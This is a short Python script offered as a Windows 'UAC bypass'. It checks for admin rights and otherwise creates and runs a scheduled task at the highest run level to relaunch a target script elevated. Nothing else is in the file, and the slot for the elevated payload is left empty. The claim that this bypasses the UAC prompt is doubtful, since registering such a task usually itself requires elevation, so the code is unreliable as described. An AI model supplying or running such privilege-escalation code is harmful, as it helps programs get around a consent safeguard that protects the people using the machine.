import os
import sys
import ctypes
import subprocess

def is_admin():
    """
    Check if the script is running with administrative privileges.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin(script):
    """
    Request the script to run as an administrator using Task Scheduler.
    Bypasses the UAC prompt.
    """
    try:
        # Command to create a scheduled task that will run the script as admin.
        subprocess.run([
            'schtasks', '/create', '/tn', 'AdminScriptTask', 
            '/tr', f'"{sys.executable}" "{script}"', '/sc', 'once', 
            '/rl', 'highest', '/st', '00:00', '/f'
        ], check=True)
        
        # Run the scheduled task immediately
        subprocess.run(['schtasks', '/run', '/tn', 'AdminScriptTask'], check=True)
        
        print("Task executed as admin.")
    except Exception as e:
        print(f"Failed to run as admin: {e}")

if __name__ == "__main__":
    # If not admin, attempt to run with elevated privileges
    if not is_admin():
        print("Not running as admin, attempting to elevate...")
        # Modify this to point to the script you want to run
        target_script = os.path.abspath("target_script.py") 
        run_as_admin(target_script)
    else:
        print("Running with admin privileges.")
        # Run the elevated code here
        # Example: os.system(f'{sys.executable} some_script.py')
        os.system(f'')
